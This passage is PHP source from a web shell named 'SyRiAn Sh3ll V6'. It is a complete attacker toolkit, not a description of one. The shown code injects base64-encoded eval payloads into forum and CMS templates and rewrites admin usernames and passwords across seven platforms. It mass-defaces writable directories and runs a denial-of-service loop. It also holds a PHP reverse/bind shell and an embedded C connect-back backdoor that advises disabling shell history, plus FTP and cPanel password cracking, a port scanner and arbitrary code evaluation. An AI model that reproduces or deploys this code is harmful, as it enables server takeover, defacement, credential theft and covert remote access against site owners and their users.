	BORDER-RIGHT:  ".$sh3llColor." 1px solid;
	BORDER-TOP:    ".$sh3llColor." 1px solid;
	BORDER-LEFT:   ".$sh3llColor." 1px solid;
	BORDER-BOTTOM: ".$sh3llColor." 1px solid;
	BACKGROUND-COLOR: #333333;
	font: 9pt tahoma;
	color: #ffffff;
	}
	select 
	{
	BORDER-RIGHT:  #ffffff 1px solid;
	BORDER-TOP:    #999999 1px solid;
	BORDER-LEFT:   #999999 1px solid;
	BORDER-BOTTOM: #ffffff 1px solid;
	BACKGROUND-COLOR: #000000;
	font: 9pt tahoma;
	color: #CCCCCC;;
	}
	submit 
	{
	BORDER:  1px outset buttonhighlight;
	BACKGROUND-COLOR: #272727;
	width: 40%;
	color: #cccccc;
	}
	textarea 
	{
	BORDER-RIGHT:  #ffffff 1px solid;
	BORDER-TOP:    #999999 1px solid;
	BORDER-LEFT:   #999999 1px solid;
	BORDER-BOTTOM: #ffffff 1px solid;
	BACKGROUND-COLOR: #333333;
	color: #ffffff;
	}
	A:link {COLOR:".$sh3llColor."; TEXT-DECORATION: none}
	A:visited { COLOR:".$sh3llColor."; TEXT-DECORATION: none}
	A:active {COLOR:".$sh3llColor."; TEXT-DECORATION: none}
	A:hover {color:blue;TEXT-DECORATION: none}
	</style>
	<script>
function ChangeFTP()
{
	if(document.getElementById('ftpType').value= 'upload')
	{document.getElementById('ftpInput').innerHTML = '<input type=\'file\' name=\'file\'>';}
	else if((document.getElementById('ftpType').value= 'download') ||(document.getElementById('ftpType').value= 'deleteFile') ||(document.getElementById('ftpType').value= 'deleteDir') ||(document.getElementById('ftpType').value= 'makeDir') ||(document.getElementById('ftpType').value= 'execute') )
	{document.getElementById('ftpInput').innerHTML = '<input name=\'username\' type=\'text\' id=\'username\' value=\'file\'>';}
	if((document.getElementById('ftpType').value= 'rename') || (document.getElementById('ftpType').value= 'chmod') )
	{document.getElementById('ftpInput').innerHTML += '<input name=\'username3\' type=\'text\' id=\'username3\' value=\'newFile\'>';}
}
function ins(text)
{
	document.nst.chars.value+=text;
	document.nst.chars.focus();
}
function Suicide()
{
	var confirmSuicide = confirm('Are You Sure You Wanna Delete the sh3ll ?');
	if(confirmSuicide == true){document.location='".currentFileName()."?id=Delete';}
	else{document.location='".currentFileName()."';}
}
function Blur(id , defalutText)
{
	if( document.getElementById(id).value == ''){document.getElementById(id).value = defalutText;}
}
function Clear(id , defalutText)
{if( document.getElementById(id).value == defalutText){document.getElementById(id).value = '';}}	
function ScriptsType()
{
	if(document.getElementById('ScriptType').value == 'vb')
	{document.getElementById('Prefix').value = '';}
	else if(document.getElementById('ScriptType').value == 'wp')
	{document.getElementById('Prefix').value = 'wp_';}
	else if(document.getElementById('ScriptType').value == 'jos')
	{document.getElementById('Prefix').value = 'jos_';}
	else if(document.getElementById('ScriptType').value == 'phpbb')
	{document.getElementById('Prefix').value = 'phpbb_';}
	else if(document.getElementById('ScriptType').value == 'ipb')
	{document.getElementById('Prefix').value = 'ipb_';}
	else if(document.getElementById('ScriptType').value == 'mybb')
	{document.getElementById('Prefix').value = 'mybb_';}
	else if(document.getElementById('ScriptType').value == 'smf')
	{document.getElementById('Prefix').value = 'smf_';}
}
function evalOrEnc2()
{
	if(document.getElementById('evalOrEnc').value == 'eval')
	{document.getElementById('php_eval').value = '<?php echo \"SyRiAn_Sh3ll V6\"; ?>';}
	else if(document.getElementById('evalOrEnc').value == 'enc')
	{document.getElementById('php_eval').value = 'my String To Encrypt';}	
	else if(document.getElementById('evalOrEnc').value == 'analyze')
	{document.getElementById('php_eval').value = 'c4ca4238a0b923820dcc509a6f75849b';}
	else if(document.getElementById('evalOrEnc').value == 'scan')
	{document.getElementById('php_eval').value = '127.0.0.1';}	
	else if(document.getElementById('evalOrEnc').value == 'genServ')
	{document.getElementById('php_eval').value = '".addslashes(getcwd())."';}	
	else if(document.getElementById('evalOrEnc').value == 'sqlScanner')
	{document.getElementById('php_eval').value = 'inurl:php?=id+site';}
	else if(document.getElementById('evalOrEnc').value == 'uploadLFI')
	{document.getElementById('php_eval').value = 'http://site.com/local.php?id=';}
	else if(document.getElementById('evalOrEnc').value == 'DirectUser')
	{document.getElementById('php_eval').value = 'example.com';}
}
function ChangeSQLType()
{
	if(document.getElementById('SQLType').value == 'SQLQuery')
	{document.getElementById('inputType').innerHTML = '<textarea name=\'QU\'  rows=\'4\' cols=\'44\'>SELECT * FROM emp ;</textarea>';}
	else if (document.getElementById('SQLType').value == 'SQLReader')
	{document.getElementById('inputType').innerHTML = '<input type=\'text\' value=\'/etc/passwd\' name=\'file\' size=\'70\'><br/>';}	
	else if (document.getElementById('SQLType').value == 'EmailExtractor')
	{document.getElementById('inputType').innerHTML = '<input type =\'text\' name=\'EM_TABLE\' value=\'users Table\' />  <input type =\'text\' name=\'EM_COLUMN\' value=\'emails Column\' />  <input type=\'submit\' value=\'?\' name=\'emailExtractorHelp\'  alt=\'Email Extractor Help\'/><br/>';}
}
function viewPass()
{
	if(document.getElementById('back_select').value == 'perl2')	
	{document.getElementById('view_pass').innerHTML= '<input type=\'text\' name=\'back_pass\' size=\'30\' value=\'password\'>';}
	else {document.getElementById('view_pass').innerHTML= '';}
	
	if(document.getElementById('bind_select').value == 'perl1-linux')	
	{document.getElementById('view_bind_pass').innerHTML= '<input type=\'text\' name=\'bind_pass\' size=\'30\' value=\'password\'>';}
	else {document.getElementById('view_bind_pass').innerHTML= '';}
	if(document.getElementById('bind_select').value == 'c1-linux')	
	{document.getElementById('view_bind_pass').innerHTML= '<input type=\'text\' name=\'bind_pass\' size=\'30\' value=\'password\'>';}
	else {document.getElementById('view_bind_pass').innerHTML= '';}

}
function addUploadInput()
{document.getElementById('uploadInput').innerHTML += '<input type=\'file\' name=\'uploadfile[]\'>';	}	
function hackingTypes()
{
	if(document.getElementById('hackingType').value == 'indexChanger')
	{   
		document.getElementById('InjectShellSpan').innerHTML = '<sy>Inject Sh3ll ? </sy><select name=\'injectShell\' id=\'injectShell\' onchange=\'injectShellFunction();\'><option value=\'no\'>NO</option><option value=\'yes\'>YES</option></select><sy> VBulletin Only ! </sy>';
		document.getElementById('SHB').innerHTML = '<textarea name=\'INDEX\' rows=\'9\' id=\'theIndex\' cols=\'45\' onblur=\'Blur(\"theIndex\",\"Put Your Index Here !\");\' onclick=\'Clear(\"theIndex\",\"Put Your Index Here !\");\'  >Put Your Index Here !</textarea>';
	}
	else if(document.getElementById('hackingType').value == 'changeInfo')
	{
		document.getElementById('InjectShellTypeSpan').innerHTML = '';
		document.getElementById('InjectShellSpan').innerHTML = '';
		document.getElementById('SHB').innerHTML = '<input name=\'adminID\' type=\'text\' id=\'adminID\' value=\'admin id ~= 1\'  onblur=\'Blur(\"adminID\",\"admin id ~= 1\");\' onclick=\'Clear(\"adminID\",\"admin id ~= 1\");\' ><input name=\'userName\' type=\'text\' id=\'userName\' value=\'username\'  onblur=\'Blur(\"userName\",\"username\");\' onclick=\'Clear(\"userName\",\"username\");\' ><input name=\'password\' type=\'text\' id=\'password\' value=\'password ( Not Encrypted !)\'  onblur=\'Blur(\"password\",\"password ( Not Encrypted !)\");\' onclick=\'Clear(\"password\",\"password ( Not Encrypted !)\");\' >';
	}
	else if(document.getElementById('hackingType').value == 'decrypt')
	{
		document.getElementById('InjectShellTypeSpan').innerHTML = '';
		document.getElementById('InjectShellSpan').innerHTML = '';
		document.getElementById('SHB').innerHTML = '';
	}
}
function injectShellFunction()
{
	if(document.getElementById('injectShell').value == 'yes')
	{
		document.getElementById('InjectShellTypeSpan').innerHTML = '<select name=\'injectShellType\'><option value=\'faq\'>FAQ</option><option value=\'search\'>Search</option><option value=\'calendar\'>Calendar</option></select>';
	}
	else {document.getElementById('InjectShellTypeSpan').innerHTML = '';}
}
function ChangeInputs()
{
	if(document.getElementById('actionType').value == 'rename')
	{document.getElementById('newName').innerHTML = '<input type=\"text\" name=\"newName\" value=\"newName.txt\" size=\"25\" /> ';	}
	else if (document.getElementById('actionType').value == 'copy')
	{document.getElementById('newName').innerHTML = '<input type=\"text\" name=\"newName\" value=\"CopyName.txt\" size=\"25\" /> ';	}
	else if (document.getElementById('actionType').value == 'createFile')
	{document.getElementById('newName').innerHTML = '<input type=\"text\" name=\"newName\" value=\"File Content\" size=\"25\" /> ';	}
	else{document.getElementById('newName').innerHTML = '';}
	
	if(document.getElementById('actionType').value == 'deleteFolder' || document.getElementById('actionType').value == 'createFolder')
	{document.getElementById('editFile').value = 'folderName';}
	else{document.getElementById('editFile').value = 'index.txt';}
}
	</script>
	</head>";
	if($_GET['id'] == '' && $_GET['info'] == ''){$css .=  "<script>window.location = '?id=mainPage';</script>";}
	return $css;
}
function Logout()
{
	print "<script>
	document.cookie='user=';
	document.cookie='pass=';
	var url = window.location.pathname;
	var filename = url.substring(url.lastIndexOf('/')+1);
	window.location=filename;
	</script>";
}
function About()
{
	$about = "
<table bgcolor=#cccccc width=\"100%\">
<tbody><tr><td width=1025>
<div align=center><img src='http://www.library-ar.com/cache/eagle.jpg' alt='SyRiAn Sh3ll'><br>
</div>
<sy><div align=center>Coded By :  EH << SyRiAn | 34G13</div></sy>
<sy><div align=center>From </font>: SyRiAn Arabic Republic  </div></sy>
<sy><div align=center>Age : 4/1991<br></div></sy>
<sy><div align=center>Thanx : [ Allah ] [ HaniWT ] [ SyRiAn_SnIpEr ] [ SyRiAn_SpIdEr ] [ TNT Hacker ]</div></sy>
<sy><div align=center>Thanx : my school : [ www.google.com ] :)</div></sy>
<sy><br><div align=center>B3 Cr34T!V3 0R D!3 TRy!nG </div></sy>
<br/>
<center>
<br/>
 <form method='post' action=''>";
    $ipi = getenv("REMOTE_ADDR");
    $httprefi = getenv ("HTTP_REFERER");
    $httpagenti = getenv ("HTTP_USER_AGENT");
 $about .= '
    <input type="hidden" name="ip" value="<?php echo $ipi ?>" />
    <input type="hidden" name="httpref" value="<?php echo $httprefi ?>" />
    <input type="hidden" name="httpagent" value="<?php echo $httpagenti ?>" />
    <input type="text" id="Your Name" name="visitor" size="35" value="Your Name" onblur="Blur(\'Your Name\',\'Your Name\');" onclick="Clear(\'Your Name\',\'Your Name\');"/><br />
    <input type="text" id="Email" name="visitormail" size="35" value="Email" onblur="Blur(\'Email\',\'Email\');" onclick="Clear(\'Email\',\'Email\');" /><br /> 
    <textarea name="notes" id="messageText" rows="7" cols="25" onblur="Blur(\'messageText\',\'Mail Message\');" onclick="Clear(\'messageText\',\'Mail Message\');">Mail Message</textarea><br />
    <input type="submit" value="Send Mail" name="sendEmail" /><br />
    </form>
	';
return $about;
}
function Connect_Host($url) 
{
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_FOLLOW, 0);
	curl_setopt($ch, CURLOPT_HEADER, 1);
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_TIMEOUT, 30);
	$data = curl_exec($ch);
	if($data) {return $data;} 
	else {return 0;}
}
function UpdatingIndex($scriptType,$index,$prefix,$injectShellType)
{
	if ($scriptType == 'vb')
	{
		$vb_index  = "{\${eval(base64_decode(\'";
		$vb_index .= base64_encode("echo \"$index\";");
		$vb_index .= "\'))}}{\${exit()}}</textarea>";
		if($injectShellType == 'faq')
		{
			$shell = mysql_query("UPDATE template SET template ='".$vb_index."' WHERE title ='faq'");
		}
		else if($injectShellType == 'calendar')
		{
			$shell = mysql_query("UPDATE template SET template ='".$vb_index."' WHERE title ='calendar'");
		}
		else if($injectShellType == 'search')
		{
			$shell = mysql_query("UPDATE template SET template ='".$vb_index."' WHERE title ='search'");
		}
		else 
		{
			$ok1 = mysql_query("UPDATE template SET template ='".$vb_index."' WHERE title ='forumhome'");
			if (!$ok1)
			{$ok2 = mysql_query("UPDATE template SET template ='".$vb_index."' WHERE title ='header'");}
			elseif (!$ok2)
			{$ok3 = mysql_query("UPDATE template SET template ='".$vb_index."' WHERE title ='spacer_open'"); }
		}
		mysql_close();
		if ($ok1 || $ok2 || $ok3 || $shell){update();}
		else {echo "Updating Has Failed !";}
	}
	else if ($scriptType == 'wp')
	{
		$tableName = $prefix."posts" ;
		$ok1 = mysql_query("UPDATE $tableName SET post_title ='".$index."' WHERE ID > 0 ");
		if(!$ok1)
		{$ok2 = mysql_query("UPDATE $tableName SET post_content ='".$index."' WHERE ID > 0 "); }
		elseif(!$ok2)
		{$ok3 = mysql_query("UPDATE $tableName SET post_name ='".$index."' WHERE ID > 0 "); }
		mysql_close();
		if ($ok1 || $ok2 || $ok3){update();}
		else {echo "Updating Has Failed !";}
	}
	else if ($scriptType == 'jos')
	{
		$jos_table_name = $prefix."menu" ;
		$jos_table_name2 = $prefix."modules" ;
		$ok1 = mysql_query("UPDATE $jos_table_name SET name ='".$index."' WHERE ID > 0 ");
		if(!$ok1)
		{$ok2 = mysql_query("UPDATE $jos_table_name2 SET title ='".$index."' WHERE ID > 0 ");}
		mysql_close();
		if ($ok1 || $ok2 || $ok3){update();}
		else {echo "Updating Has Failed !";}
	}
	else if ($scriptType == 'phpbb')
	{
		$php_table_name = $prefix."forums";
		$php_table_name2 = $prefix."posts";
		$ok1 = mysql_query("UPDATE $php_table_name SET forum_name ='".$index."' WHERE forum_id > 0 ");
		if(!$ok1)
		{$ok2 = mysql_query("UPDATE $php_table_name2 SET post_subject ='".$index."' WHERE post_id > 0 "); }
		mysql_close();
		if ($ok1 || $ok2 || $ok3){update();}
		else {echo "Updating Has Failed !";}
	}
	else if ($scriptType == 'ipb')
	{
		$ip_table_name = $prefix."components" ;
		$ip_table_name2 = $prefix."forums" ;
		$ip_table_name3 = $prefix."posts" ;
		$ok1 = mysql_query("UPDATE $ip_table_name SET com_title ='".$index."' WHERE com_id > 0");
		if(!$ok1)
		{$ok2 = mysql_query("UPDATE $ip_table_name2 SET name ='".$index."' WHERE id  > 0"); }
		if(!$ok2)
		{
			$ok3 = mysql_query("UPDATE $ip_table_name3 SET post  ='".$index."' WHERE pid <10")  or die("Can't Update Templates !!"); 
		}
		mysql_close();
		if ($ok1 || $ok2 || $ok3){update();}
		else {echo "Updating Has Failed !";}
	}
	else if ($scriptType == 'smf')
	{
		$table_name = $prefix."boards" ;
		{$ok1 = mysql_query("UPDATE $table_name SET description ='".$index."' WHERE ID_BOARD > 0");}
		if(!$ok1){$ok2 = mysql_query("UPDATE $table_name SET name ='".$index."' WHERE ID_BOARD > 0");}
		mysql_close();
		if ($ok1 || $ok2){update();}
		else {echo "Updating Has Failed !";}
	}
	else if ($scriptType == 'mybb')
	{
		$mybb_prefix = $prefix."templates";
		$ok = mysql_query(" update $mybb_prefix set template='".$index."' where title='index' ");
		if ($ok){update();}
		else {echo "Updating Has Failed !";}
		mysql_close();
	}
}
function AutoUpdateIndex()
{	
	getConfigInfo($ScriptType);
	DBConnect($host,$user,$pass,$dbName);
	UpdatingIndex($ScriptType,$index,$prefix,$injectFAQ);
}
function changeInfo($ScriptType,$adminID,$userName,$password)
{
				if($ScriptType == 'vb')
				{
					//VB Code
					$password = md5($password);
					$tryChaningInfo = mysql_query("UPDATE user SET username = '".$userName."' , password = '".$password."' WHERE userid = ".$adminID."");
					if($tryChaningInfo)
					{update();}
					else {echo "Error !!";}
				}
				else if($ScriptType == 'wp')
					{
						//WoredPress
						$password = crypt($password); 
						$tryChaningInfo = mysql_query("UPDATE wp_users SET user_login = '".$userName."' , user_pass = '".$password."' WHERE ID = ".$adminID."");
						if($tryChaningInfo)
						{update();}
						else {mysql_error();}
					}
					else if($ScriptType == 'jos')
					{
						//Joomla 
						$password = crypt($password); 
						$tryChaningInfo = mysql_query("UPDATE jos_users SET username ='".$userName."' , password = '".$password."' WHERE ID = ".$adminID."");
						if($tryChaningInfo)
						{update();}
						else {mysql_error();}
					}
						else if($ScriptType == 'phpbb')
						{
							//PHPBB3
							$password = md5($password); 
							$tryChaningInfo = mysql_query("UPDATE phpbb_users SET username ='".$userName."' , user_password = '".$password."' WHERE user_id = ".$adminID."");
							if($tryChaningInfo)
							{update();}
							else {mysql_error();}
						}
							else if($ScriptType == 'ibf')
							{
								//IPBoard 
								$password = md5($password); 
								$tryChaningInfo = mysql_query("UPDATE ibf_members SET name ='".$userName."' , member_login_key = '".$password."' WHERE id = ".$adminID."");
								if($tryChaningInfo)
								{update();}
								else {mysql_error();}
							}
								else if($ScriptType == 'smf')
								{
									//SMF
									$password = md5($password); 
									$tryChaningInfo = mysql_query("UPDATE smf_members SET memberName ='".$userName."' , passwd = '".$password."' WHERE ID_MEMBER = ".$adminID."");
									if($tryChaningInfo)
									{update();}
									else {mysql_error();}
								}
									else if($ScriptType == 'mybb')
									{
										//MyBB
										$password = md5($password); 
										$tryChaningInfo = mysql_query("UPDATE mybb_users SET username ='".$userName."' , password = '".$password."' WHERE uid = ".$adminID."");
										if($tryChaningInfo)
										{update();}
										else {mysql_error();}
									}
}
function UnZip($fileName,$currentPath)
{
	if(class_exists('ZipArchive'))
	{
		$zip = new ZipArchive;
		$res = $zip->open($fileName);
		if ($res === TRUE) {$zip->extractTo($currentPath);$zip->close();} 
	}
	else{$extractCom = 'unzip '.$fileName;Exe($extractCom);}
}
function ZipFile($fileName,$path)
{
	$path = $path."\\".$fileName;
	$zip = new ZipArchive;
	if ($zip->open($fileName) === TRUE) 
	{
		$zip->addFile($path,$fileName);
		$zip->addFile($path,$fileName);
		$zip->close();
	}
	if(!$zip){$zip = Exe('gzip '.$fileName);}
	if($zip){return true;}else{return false;}
}
function _mysql_all_fields($result)
{
  $fields = Array();
  for ($i = 0; $i < mysql_num_fields($result); $i++)
  {array_push($fields, mysql_field_name($result, $i));}
  return $fields;
}
function massDefacement($addres,$massname,$masssource)
{
	$slash="\\";
	$idd=0;
	if ($dirhen = opendir($addres)) 
    {
		GenerateFile($massname,$masssource);
        while ($file = readdir($dirhen)) 
        {
			$permdir = str_replace('//','/',$addres.$slash.$file);
			if($file!='.' && $file!='..' && is_dir($permdir))
			{
				if (is_writable($permdir)) 
				{
                    if ($fm=fopen($permdir.$slash.$massname,"w"))
                    {
                        fwrite($fm,$masssource);
                        fclose($fm);
                        $dirdata[$idd]['filename']=$permdir; 
                    }
					$idd++;
				}
				massDefacement($permdir);
			}
		}
		closedir($dirhen);
	} 
    else {return ("notperm");}
	if ($dirdata){return $dirdata;}
    else{return "notfound";}
}
function dosserver()
{
	$junk=str_repeat("99999999999999999999999999999999999999999999999999",99999);
	for($i=0;$i<2;)
	{
		$buff=bcpow($junk, '3', 2);
		$buff=null;
	}
}
function cx()
{cx();}
function DB_NET_GET_SOCKET_PROTOCOL($prot) 
{
	switch($prot) {
		case "udp":
			$protocol = SOL_UDP;
			$socktype = SOCK_DGRAM;
		break;
		case "tcp":
		default:
			$protocol = SOL_TCP;
			$socktype = SOCK_STREAM;
		break;
	}
	return(array($protocol, $socktype));
}
function DB_NET_CONNECT($hostname, $port=80, $prot="tcp") 
{
	$address = gethostbyname($hostname);
	list($protocol, $socktype) = DB_NET_GET_SOCKET_PROTOCOL($prot);
	switch($prot) {
		case "udp":
			$protocol = SOL_UDP;
			$socktype = SOCK_DGRAM;
		break;
		case "tcp":
		default:
			$protocol = SOL_TCP;
			$socktype = SOCK_STREAM;
		break;
	}
	$socket = socket_create(AF_INET, $socktype, $protocol);
	if ($socket < 0) {
		echo "socket_create() failed: reason: " . socket_strerror($socket) . "\n";
	}
	$result = socket_connect($socket, $address, $port);
	if ($result < 0) {
		echo "socket_connect() failed.\nReason: ($result) " . socket_strerror($result) . "\n";
	}
	return $socket;
}
function DB_NET_LISTEN($address, $port) 
{
	if (($sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP)) < 0) {
		echo "socket_create() failed: reason: " . socket_strerror($sock) . "\n";
		return(-1);
	}
	if (($ret = socket_bind($sock, $address, $port)) < 0) {
		echo "socket_bind() failed: reason: " . socket_strerror($ret) . "\n";
		return(-2);
	}
	if (($ret = socket_listen($sock, 5)) < 0) {
		echo "socket_listen() failed: reason: " . socket_strerror($ret) . "\n";
		return(-3);
	}
	return($sock);
}
function DB_Shell($type, $shell, $port, $host) 
{
	$shell = 'export TERM=xterm; bash -i';
	if($type == "cb") 
	{$procsock = DB_NET_CONNECT($host, $port, "tcp");} 
	elseif ($type == "pb") 
	{
		$lsock = DB_NET_LISTEN($host, $port);
		if (($procsock = socket_accept($lsock)) < 0)
		{return "socket_accept() failed: reason: " . socket_strerror($procsock) . "\n";}
	}
	else {return "Error no connection details specified!";}

	set_time_limit(9000);
	$descriptorspec = array(
		0 => array("pipe", "r"),
		1 => array("pipe", "w"),
		2 => array("pipe", "w")
	);
	$process = proc_open($shell, $descriptorspec, $pipes);
	if (is_resource($process)) {
		$tmp_loop = 1;
		do {
			$tmp_array = array($procsock);
			$num_changed_sockets = socket_select($tmp_array, $write = NULL, $except = NULL, 0);
			if ($num_changed_sockets === false) {
				$tmp_loop = 0;
			} else if ($num_changed_sockets > 0) {
				foreach($tmp_array as $k => $v) {
					if($v == $procsock) {
						if(socket_last_error($procsock) > 0) $tmp_loop = 0;
						if($tmp_loop == 1 && false == ($buf = socket_read($procsock, 2048, PHP_NORMAL_READ))) $tmp_loop = 0;
						fwrite($pipes[0], $buf);
					}
				}
			}
			$tmp_arrayS = array($pipes[1], $pipes[2]);
			$num_changed_streams = stream_select($tmp_arrayS, $write = NULL, $except = NULL, 0);
			if ($num_changed_streams === FALSE) {
				$tmp_loop = 0;
			} else if ($num_changed_streams > 0) {
				foreach($tmp_arrayS as $k => $v) {
					if($tmp_loop == 1 && false == ($buf = fread($v, 2048))) $tmp_loop = 0;
					socket_write($procsock, $buf, strlen($buf));
				}
			}
		} 
		while($tmp_loop == 1);
	} 
	else {return "Error executing shell " . $shell;}
}
function connect_back_C($tmp_dir = '/tmp', $compiler = 'gcc', $host, $port) 
{
    $shell = "#include <stdio.h>\n" .
             "#include <sys/socket.h>\n" .
             "#include <netinet/in.h>\n" .
             "#include <arpa/inet.h>\n" .
             "#include <netdb.h>\n" .
             "int main(int argc, char **argv) {\n" .
             "  char *host;\n" .
             "  int port = 80;\n" .
             "  int f;\n" .
             "  int l;\n" .
             "  int sock;\n" .
             "  struct in_addr ia;\n" .
             "  struct sockaddr_in sin, from;\n" .
             "  struct hostent *he;\n" .
             "  char msg[ ] = \"Welcome to Data Cha0s Connect Back Shell\\n\\n\"\n" .
             "                \"Issue \\\"export TERM=xterm; exec bash -i\\\"\\n\"\n" .
             "                \"For More Reliable Shell.\\n\"\n" .
             "                \"Issue \\\"unset HISTFILE; unset SAVEHIST\\\"\\n\"\n" .
             "                \"For Not Getting Logged.\\n(;\\n\\n\";\n" .
             "  printf(\"Data Cha0s Connect Back Backdoor\\n\\n\");\n" .
             "  if (argc < 2 || argc > 3) {\n" .
             "    printf(\"Usage: %s [Host] <port>\\n\", argv[0]);\n" .
             "    return 1;\n" .
             "  }\n" .
             "  printf(\"[*] Dumping Arguments\\n\");\n" .
             "  l = strlen(argv[1]);\n" .
             "  if (l <= 0) {\n" .
             "    printf(\"[-] Invalid Host Name\\n\");\n" .
             "    return 1;\n" .
             "  }\n" .
             "  if (!(host = (char *) malloc(l))) {\n" .
             "    printf(\"[-] Unable to Allocate Memory\\n\");\n" .
             "    return 1;\n" .
             "  }\n" .
             "  strncpy(host, argv[1], l);\n" .
             "  if (argc == 3) {\n" .
             "    port = atoi(argv[2]);\n" .
             "    if (port <= 0 || port > 65535) {\n" .
             "      printf(\"[-] Invalid Port Number\\n\");\n" .
             "      return 1;\n" .
             "    }\n" .
             "  }\n" .
             "  printf(\"[*] Resolving Host Name\\n\");\n" .
             "  he = gethostbyname(host);\n" .
             "  if (he) {\n" .
             "    memcpy(&ia.s_addr, he->h_addr, 4);\n" .
             "  } else if ((ia.s_addr = inet_addr(host)) == INADDR_ANY) {\n" .
             "    printf(\"[-] Unable to Resolve: %s\\n\", host);\n" .
             "    return 1;\n" .
             "  }\n" .
             "  sin.sin_family = PF_INET;\n" .
             "  sin.sin_addr.s_addr = ia.s_addr;\n" .
             "  sin.sin_port = htons(port);\n" .
             "  printf(\"[*] Connecting...\\n\");\n" .
             "  if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1) {\n" .
             "    printf(\"[-] Socket Error\\n\");\n" .
             "    return 1;\n" .
             "  }\n" .
             "  if (connect(sock, (struct sockaddr *)&sin, sizeof(sin)) != 0) {\n" .
             "    printf(\"[-] Unable to Connect\\n\");\n" .
             "    return 1;\n" .
             "  }\n" .
             "  printf(\"[*] Spawning Shell\\n\");\n" .
             "  f = fork( );\n" .
             "  if (f < 0) {\n" .
             "    printf(\"[-] Unable to Fork\\n\");\n" .
             "    return 1;\n" .
             "  } else if (!f) {\n" .
             "    write(sock, msg, sizeof(msg));\n" .
             "    dup2(sock, 0);\n" .
             "    dup2(sock, 1);\n" .
             "    dup2(sock, 2);\n" .
             "    execl(\"/bin/sh\", \"shell\", NULL);\n" .
             "    close(sock);\n" .
             "    return 0;\n" .
             "  }\n" .
             "  printf(\"[*] Detached\\n\\n\");\n" .
             "  return 0;\n" .
             "}\n";
    $fbname = $tmp_dir . "/cbs";
	GenerateFile($fbname . ".c",$shell);
	$command = $compiler . " -o " . $fbname . " " . $fbname . ".c";
	Exe($command);
	$command = $fbname . " " . $host . " " . $port;
	Exe($command);
}
function HashAnalyzer($hash)
{
	$subHash = substr($hash,0,3);
	if($subHash =='$ap' && strlen($hash) == 37){echo "The Hash : ".$hash." is : MD5(APR) Hash";}
	else if($subHash =='$1$' && strlen($hash) == 34){echo "The Hash : ".$hash." is : MD5(UNIX) Hash";}
	else if($subHash =='$H$' && strlen($hash) == 35){echo "The Hash : ".$hash." is : MD5(phpBB3) Hash";}
	else if(strlen($hash) == 29){echo "The Hash : ".$hash." is : MD5(Wordpress) Hash";}
	else if($subHash =='$5$' && strlen($hash) == 64){echo "The Hash : ".$hash." is : SHA256(UNIX) Hash";}
	else if($subHash =='$6$' && strlen($hash) == 128){echo "The Hash : ".$hash." is : SHA512(UNIX) Hash";}
	else if(strlen($hash) == 56){echo "The Hash : ".$hash." is : SHA224 Hash";}
	else if(strlen($hash) == 64){echo "The Hash : ".$hash." is : SHA256 Hash";}
	else if(strlen($hash) == 96){echo "The Hash : ".$hash." is : SHA384 Hash";}
	else if(strlen($hash) == 128){echo "The Hash : ".$hash." is : SHA512 Hash";}
	else if(strlen($hash) == 40){echo "The Hash : ".$hash." is : MySQL V5.3.x Hash";}
	else if(strlen($hash) == 16){echo "The Hash : ".$hash." is : MySQL Hash";}
	else if(strlen($hash) == 13){echo "The Hash : ".$hash." is : DES(Unix) Hash";}
	else if(strlen($hash) == 32){echo "The Hash : ".$hash." is : MD5 Hash";}
	else if(strlen($hash) == 4){echo "The Hash : ".$hash." is : [CRC-16]-[CRC-16-CCITT]-[FCS-16]";}
	else {echo "Error : Can't Detect Hash Type";}
}
function Evaluation($eval)
{
	$eval = str_replace("<?php","",$eval);
	$eval = str_replace("<?php","",$eval);
	$eval = str_replace("?>","",$eval);
	$eval = str_replace("\\","",$eval);
	$eval = eval($eval);
	if($eval){return true;}else{return false;}
}
function PortsScanner($domainToScan)
{
	if(!$domainToScan){echo "[-] Enter IP Address Or Domain To Scan";}
	else 
	{
		for($i=0;$i<1024;$i++) 
		{
			$fp = fsockopen($domainToScan,$i,$errno,$errstr,10);
			if($fp){echo "[+] port " . $i . " open on " . $domainToScan . "
";}
			flush();
		} 
		fclose($fp);
	}
}
function FetchURL($url) 
{
   $ch = curl_init();
   curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/3.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.20) Gecko/20081217 Firefox/2.0.0.20 (.NET CLR 3.5.30729)");
   curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
   curl_setopt($ch, CURLOPT_HEADER, 1);
   curl_setopt($ch, CURLOPT_URL, $url);
   curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
   curl_setopt($ch, CURLOPT_TIMEOUT, 30);
   $data = curl_exec($ch);
   if(!$data) { 
        return false; 
   }
   return $data;
}
function ftp_check($host,$user,$pass,$timeout)
{
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "ftp://$host");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
	curl_setopt($ch, CURLOPT_FTPLISTONLY, 1);
	curl_setopt($ch, CURLOPT_USERPWD, "$user:$pass");
	curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
	curl_setopt($ch, CURLOPT_FAILONERROR, 1);
	$data = curl_exec($ch);
	if ( curl_errno($ch) == 28 ) 
	{
		 print "Error : Connection Timeout Please Check The Target Hostname .";
		 exit;
	}
	elseif ( curl_errno($ch) == 0 ){print "[+] Cracking Success With Username ($user) and Password ($pass)";}
	curl_close($ch);
}
function cpanel_check($host,$user,$pass,$timeout)
{
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "http://$host:2082");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
	curl_setopt($ch, CURLOPT_USERPWD, "$user:$pass");
	curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
	curl_setopt($ch, CURLOPT_FAILONERROR, 1);
	$data = curl_exec($ch);
	if ( curl_errno($ch) == 28 ) 
	{ 
		print "[-] Connection Timeout Please Check The Target Hostname .";
		exit;
	}
	elseif ( curl_errno($ch) == 0 ){print "[+] Cracking Success With Username ($user) and Password ($pass)";}
	curl_close($ch);
}
# ---------------------------------------#
#             Authentication             #
#----------------------------------------#
if ($uselogin ==1)
{
